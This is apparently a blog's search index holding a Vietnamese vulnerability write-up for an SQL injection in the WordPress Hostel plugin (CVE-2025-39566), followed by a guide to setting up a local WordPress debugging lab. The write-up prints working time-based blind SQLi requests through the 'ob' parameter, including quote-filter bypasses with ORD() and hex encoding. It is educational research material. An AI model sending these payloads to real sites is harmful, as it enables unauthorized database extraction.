add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a 